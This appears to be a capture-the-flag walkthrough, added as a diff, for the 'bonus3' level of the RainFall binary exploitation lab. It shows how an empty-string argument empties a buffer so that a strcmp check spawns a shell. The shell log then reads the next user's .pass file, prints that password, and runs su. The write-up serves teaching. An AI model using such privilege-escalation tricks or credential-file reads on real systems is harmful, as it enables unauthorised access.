@@ -1,0 +1,41 @@
+====================== BONUS3 WALKTHROUGH =======================
+
+=> the program allocates 132 bytes for buffer and opens the .pass file in read mode (r), then initialize each character with 0 using memset.
+
+=> the program checks if (ac != 2) it returns immediately so we should add exactly one argument.
+
+=> inside the else statement, fread() reads 66 character from the password file and put them inside buffer then 0.
+
+=> afterward, buffer[atoi(av[1])] = 0; we can inject a value with av[1] argument and we know that a non-integer input will cause atoi() to return 0.
+
+=> fread(&buffer[66], 1, 65, f); the program start reading again but f is already pointing at the EOF since it copied the whole password already.
+
+=======================================
+    if (strcmp(buffer, av[1]) == 0)
+        execl("/bin/sh", "sh", NULL);
+=======================================
+
+==> this if statement is the most important part, we need that the buffer to be equal to av[1] so the strcmp returns 0 so the shell opens for us.
+
+a. (buffer[0] = 0) => buffer here will be concidered as an empty string.
+b. so if we pass an empty string in our arguement atoi will convert it as 0 so the buffer becomes empty, so strcmp(buffer, av[1]) will return 0,
+and then we got our shell:
+
+--------------------------------------------------------------------
+bonus3@RainFall:~$ ./bonus3 ""
+$ cat /home/user/end/.pass   
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+$ su end
+Password: 
+end@RainFall:~$ ls -la
+total 13
+dr-xr-x---+ 1 end  end     80 Sep 23  2015 .
+dr-x--x--x  1 root root   340 Sep 23  2015 ..
+-rw-r--r--  1 end  end    220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 end  end   3489 Sep 23  2015 .bashrc
+-rwsr-s---+ 1 end  users   26 Sep 23  2015 end
+-r--r-----+ 1 end  end     65 Sep 23  2015 .pass
+-rw-r--r--  1 end  end    675 Apr  3  2012 .profile
+end@RainFall:~$ cat end 
+Congratulations graduate!
+--------------------------------------------------------------------
